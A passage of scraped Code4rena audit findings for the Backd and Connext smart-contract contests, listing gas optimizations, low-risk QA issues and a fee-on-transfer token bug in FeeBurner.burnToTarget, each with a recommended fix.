    "body": "## FINDINGS\n\n## Comparisons: != is more efficient than > in require\n\n!= 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that > 0 is cheaper than !=, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a require statement, this will save gas. You can see this [tweet](https://twitter.com/gzeon/status/1485428085885640706) for more proofs: \n\nI suggest changing > 0 with != 0 here:\n\nFile: BkdLocker.sol [line 91](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91)\n```\nrequire(amount > 0, Error.INVALID_AMOUNT);\n```\nSince **amount** is a uint256, it means it's value can never be less than 0 so the test > 0 is essentially testing that amount is not equal to 0 a\n\n**Other Instances**\nFile: BkdLocker.sol [line 92](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92)\n```\nrequire(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);\n```\n\n\nFile: BkdLocker.sol [line 137](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137)\n```\nrequire(length > 0, \"No entries\");\n```\n\nFile: VestedEscrow.sol [line 84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84)\n```\nrequire(unallocatedSupply > 0, \"No reward tokens in contract\");\n```\nFile: AmmGauge.sol [line 104](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104)\n```\nrequire(amount > 0, Error.INVALID_AMOUNT);\n```\nFile: AmmGauge.sol [line 125](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125)\n```        \nrequire(amount > 0, Error.INVALID_AMOUNT);\n```\n\n## use shorter revert strings(less than 32 bytes) or use custom errors\n\nFile: Minter.sol [line 150](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150)\n\n```require(\n            issuedNonInflationSupply + amount <= nonInflationDistribution,\n            \"Maximum non-inflation amount exceeded.\"\n        );\n```\n\n## Cache the length of arrays in loops\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\nCaching the array length in the stack saves around 3 gas per iteration.\nTherefore, it’s possible to save a significant amount of gas  especially when the length is significantly big.\n\nHere, I suggest storing the array’s length in a variable before the for-loop, and use it instead:\n\n\nFile:StakerVault.sol [line 259](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259) \n\n```\nfunction getStakedByActions() external view override returns (uint256) {\n        address[] memory actions = addressProvider.allActions();\n        uint256 total;\n        for (uint256 i; i < actions.length; i = i.uncheckedInc()) {\n            total += balances[actions[i]];\n        }\n        return total;\n    }\n```\nThe line to modify:\n\n```\nfor (uint256 i; i < actions.length; i = i.uncheckedInc()) {\n```\n\n\n**Other Instance to change**\nFile: RewardHandler.sol [line 35-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L35-L55)\n\n```    function burnFees() external override {\n        IBkdLocker bkdLocker = IBkdLocker(addressProvider.getBKDLocker());\n        IFeeBurner feeBurner = addressProvider.getFeeBurner();\n        address targetLpToken = bkdLocker.rewardToken();\n        address[] memory pools = addressProvider.allPools();\n        uint256 ethBalance = address(this).balance;\n        address[] memory tokens = new address[](pools.length);\n        for (uint256 i; i < pools.length; i = i.uncheckedInc()) {\n            ILiquidityPool pool = ILiquidityPool(pools[i]);\n            address underlying = pool.getUnderlying();\n            if (underlying != address(0)) {\n                _approve(underlying, address(feeBurner));\n            }\n            tokens[i] = underlying;\n        }\n        feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);\n        uint256 burnedAmount = IERC20(targetLpToken).balanceOf(address(this));\n        IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);\n        bkdLocker.depositFees(burnedAmount);\n        emit Burned(targetLpToken, burnedAmount);\n    }\n```\nThe specific line to change [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42)\n```       \nfor (uint256 i; i < pools.length; i = i.uncheckedInc()) {\n```\n\n\nFile: PoolMigrationZap.sol [line 22](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22)\n```        \nfor (uint256 i; i < newPools_.length; ++i) {\n```\n\n\nSomething similar to my propasal **was implemented on this contract as shown in the function below.**\nFile:Controller.sol [line 121-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L121-L130)\n```    function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {\n        // solhint-disable-previous-line ordering\n        uint256 totalEthRequired;\n        address[] memory actions = addressProvider.allActions();\n        uint256 numActions = actions.length;\n        for (uint256 i; i < numActions; i = i.uncheckedInc()) {\n            totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);\n        }\n        return totalEthRequired;\n    }\n```\nNote the array length was cached to **numActions**\n\n\n**Also Implemented on here:**\nFile:InflationManager.sol [line 96-100](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L96-L100)\n```address[] memory liquidityPools = addressProvider.allPools();\n        uint256 length = liquidityPools.length;\n        for (uint256 i; i < length; i = i.uncheckedInc()) {\n            _removeKeeperGauge(address(liquidityPools[i]));\n        }\n```\n\n### Using unchecked blocks to save gas\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block: [see official docs](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic)\n\nFile: VestedEscrow.sol [line 63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63)\n```        \ntotalTime = endtime_ - starttime_;\n```\nThe above line cannot overflow due to the check on the line shown below\nFile: VestedEscrow.sol [line 58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L58)\n```        \nrequire(endtime_ > starttime_, \"end must be greater\");\n```\nIn this contract we have a library that can aid in having unchecked arithmetics that is **libraries/UncheckedMath.sol** imported on  [line 21](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L21)\n\nWith the help of this library we can modify our arithmetic to \n\n```        \ntotalTime = endtime_.uncheckedSub(starttime_);\n```\nA similar approach was implemented in the file below.\nFile: StakerVault.sol [lines 229-230](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L229-L230)\n\n```        \nif (actionLockedBalances[account] > amount) {\n            actionLockedBalances[account] = actionLockedBalances[account].uncheckedSub(amount);\n```\n\n\n**Other Instances to modify**\nFile:  VestedEscrow.sol [line 155](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L155)\n```        \nuint256 elapsed = _time - startTime;\n```\nThe above cannot underflow due to the check on [line 152](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L152) which ensures that time is greater than startTime\n```        \nif (_time < startTime) {\n            return 0;\n        }\n        uint256 elapsed = _time - startTime;\n        return Math.min((locked * elapsed) / totalTime, locked);\n```\n\nThis  ```uint256 elapsed = _time - startTime;```  should be changed to  ```uint256 elapsed = _time.uncheckedSub(startTime);```\n\n\n\nFile: StakerVault.sol  [line 124](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L124)\n\n```        \nbalances[msg.sender] -= amount;\n```\n\nThe above line cannot underflow due the check on [line 113](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L113)\n```        \nrequire(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE);\n```\nThe checks ensures that **balances[msg.sender]** is greater or equal to **amount** therefore balances[msg.sender]-amount will never underflow.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/140"
    }
  },
  {
    "title": "QA Report",
    "body": "# ISSUE LIST\n\n## C4-001 : Missing events for only functions that change critical parameters - Non Critical\n## C4-002 : Critical changes should use two-step procedure - Non Critical\n## C4-003 : Missing zero-address/values check in the constructor - Low\n## C4-004 : The Contract Should approve(0) first\n## C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n## C4-006 : Contract should have pause/unpause functionality\n## C4-007 : Front-runnable Initializers\n\n\n\n\n# ISSUES\n\n# C4-001 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n\n# C4-002 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L50\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-003 : # Missing zero-address&values check in the constructor\n\n## Impact\n\nMissing checks for zero-addresses&values may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\nThere are a few validations that could be added to the system:\n\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L33\n\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L55\n\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L51\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address and zero value checks.\n\n# C4-004 : The Contract Should approve(0) first\n\n## Impact  - LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).safeApprove(address(operator), 0);\nIERC20(token).safeApprove(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  protocol/contracts/tokenomics/AmmConvexGauge.sol::61 => IERC20(ammToken).safeApprove(booster, type(uint256).max);\n  protocol/contracts/tokenomics/FeeBurner.sol::118 => IERC20(token_).safeApprove(spender_, type(uint256).max);\n\n```\n\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.\n\n\n# C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nprotocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token\nprotocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom(\nprotocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount);\nprotocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_);\nprotocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for \"airdropped\" reward token\nprotocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable);\nprotocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount);\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-006 : Contract should have pause/unpause functionality\n\n## Impact\n\nIn case a hack is occuring or an exploit is discovered, the team should be able to pause\nfunctionality until the necessary changes are made to the system. Additionally, the AuraLocker.sol contract should be manged by proxy so that upgrades can be made by the owner.\n\nTo use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before\nthe system transferred funds to the hacker. However, they were not able to shut the system down fast enough.\n(According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L249\n\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nPause functionality on the contract would have helped secure the funds quickly.\n\n\n# C4-007 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nprotocol/contracts/BkdLocker.sol:53:    function initialize(\nprotocol/contracts/LpToken.sol:28:    function initialize(\nprotocol/contracts/StakerVault.sol:71:    function initialize(address _token) external override initializer {\n\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/134"
    }
  },
  {
    "title": "Fee-on transfer tokens in `FeeBurner.burnToTarget` will revert transaction",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L70\n\n\n# Vulnerability details\n\n## Impact\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\n\n## Proof of Concept\n\nThe `FeeBurner.burnToTarget` function will try to swap more of an ERC20 token than the contract actually received and due to transfering the token into the `SwapperRouter` contract, the token balance is insufficient and the transfer will revert.\n\n[tokenomics/FeeBurner.sol#L70](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L70)\n\n```solidity\ntoken_.safeTransferFrom(msg.sender, address(this), tokenBalance_); // @audit-info less tokens will be received in the contract when using fee-on transfer tokens\nif (address(token_) == targetUnderlying_) continue;\n_approve(address(token_), address(swapperRouter_));\nswapperRouter_.swap(address(token_), _WETH, tokenBalance_); // @audit-info the swap function transfers the `token_` to itself and due to `tokenBalance_` not reflecting the correct token amount in the contract, the swap will revert\n```\n\n## Tools Used\n\nManual review\n\n## Recommended mitigation steps\n\nAs other contracts (e.g. `AmmGauge.stakeFor`) already handle fee-on transfer tokens correctly, make sure also `FeeBurner.burnToTarget` does so.\n\nCompare the token balance before the transfer and after the transfer and use the delta as the actual swap amount to prevent the `FeeBurner.burnToTarget` function reverting for fee-on transfer tokens:\n\n```solidity\nfunction burnToTarget(address[] memory tokens_, address targetLpToken_)\n    public\n    payable\n    override\n    returns (uint256 received)\n{\n    ...\n\n    uint256 oldBal = token_.balanceOf(address(this));\n    token_.safeTransferFrom(msg.sender, address(this), tokenBalance_);\n    uint256 swapAmount = token_.balanceOf(address(this)) - oldBal;\n\n    if (address(token_) == targetUnderlying_) continue;\n    _approve(address(token_), address(swapperRouter_));\n    swapperRouter_.swap(address(token_), _WETH, swapAmount); // @audit-info use `swapAmount`\n\n    ...\n}\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/133"
    }
  },
  {
    "title": "QA Report",
    "body": "## Don't use deprecated library functions\n\nInformation :\n[L005 - Do not use Deprecated Library Functions](https://github.com/byterocket/c4-common-issues/blob/main/2-Low-Risk.md#l005---do-not-use-deprecated-library-functions)\n[SafeERC20.sol - safeApprove](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65b45726b34dafe8fc3ef78c3d4b7b3f404f61ad/contracts/token/ERC20/utils/SafeERC20.sol#L39)\n\n### Instances include :\n```\ncore/connext/libraries/AssetLogic.sol:347:        SafeERC20.safeApprove(IERC20(_assetIn), address(pool), _amountIn);\n```\n\n### Recommendation\nUsage of deprecated library functions, for instance `safeApprove` from OpenZeppelin's `SafeERC20` library is discouraged, it is recommended to use `safeIncreaseAllowance` and `safeDecreaseAllowance` instead, for example :\n```\ncore/connext/libraries/AssetLogic.sol:347:        SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amountIn);\n```\n---\n",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/276"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Use != 0 instead of > 0 when comparing unsigned integers\n\n!= 0 will do the same as > 0 for unsigned integers, but != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled.\n\n### Instances include :\n```\ncore/connext/libraries/SwapUtils.sol:845:      require(v.totalSupply != 0 || amounts[i] > 0, \"Must supply all tokens in pool\");\ncore/connext/libraries/AmplificationUtils.sol:86:    require(futureA_ > 0 && futureA_ < MAX_A, \"futureA_ must be > 0 and < MAX_A\");\ncore/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:226:      require(_calldata.length > 0, \"LibDiamondCut: _calldata is empty but _init is not address(0)\");\ncore/connext/libraries/LibDiamond.sol:247:    require(contractSize > 0, _errorMessage);\ncore/connext/helpers/ConnextPriceOracle.sol:150:    require(baseTokenPrice > 0, \"invalid base token\");\n```\n\n### Recommendation\nIt is recommended to replace `> 0` with `!= 0`, as they do the same thing for unsigned integers, and '!= 0' costs less gas compared to `> 0` in require statements with the optimizer enabled, also enable the optimizer. \n\nFor example :\n```\ncore/connext/helpers/ConnextPriceOracle.sol:150:    require(baseTokenPrice != 0, \"invalid base token\");\n```\n---\n## Don't explicitly initialize variables with the default value\n\nUninitialized variables are assigned with the default value of their type, initializing a variable with its default value costs unnecessary gas.\n\n### Instances include :\n```\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:81:    for (uint256 i = 0; i < length; ) {\ncore/shared/Version.sol:9:  uint8 public constant VERSION = 0;\ncore/connext/facets/VersionFacet.sol:16:  uint8 internal immutable _version = 0;\ncore/connext/facets/BridgeFacet.sol:68:  uint16 public constant AAVE_REFERRAL_CODE = 0;\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/Encoding.sol:22:    for (uint8 i = 0; i < 10; i += 1) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) {\ncore/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\n```\n\n### Recommendation\nIt is recommended to initialize variables without assigning them the default value, for example :\n```\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i; i < tokenAddresses.length; i++) {\n```\n---\n## Cache array length outside of for loop\n\nCaching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.\n\n### Instances include :\n```\ncore/connext/facets/RelayerFacet.sol:140:    for (uint256 i; i < _transferIds.length; ) {\ncore/connext/facets/RelayerFacet.sol:164:    for (uint256 i; i < _transferIds.length; ) {\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {\ncore/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\n```\n\n### Recommendation\nIt is recommended to cache the array length on a variable before running the loop, then it doesn't need to read the length on every iteration, which cost gas, for example :\n```\nuint256 len = tokenAddresses.length;\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < len; i++) {\n```\n---\n\n## If possible, use prefix increment instead of postfix increment\n\nPrefix increment `++i` returns the updated value after it's incremented and postfix increment `i++` returns the original value then increments it. Prefix increment costs less gas compared to postfix increment.\n\n### Instances includes :\n```\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:85:        i++;\ncore/connext/facets/RelayerFacet.sol:144:        i++;\ncore/connext/facets/RelayerFacet.sol:168:        i++;\ncore/connext/facets/BridgeFacet.sol:613:          i++;\ncore/connext/facets/BridgeFacet.sol:684:          i++;\ncore/connext/facets/BridgeFacet.sol:799:            i++;\ncore/connext/facets/DiamondLoupeFacet.sol:31:    for (uint256 i; i < numFacets; i++) {\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) {\ncore/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {\ncore/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:134:      selectorPosition++;\ncore/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:153:      selectorPosition++;\ncore/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; 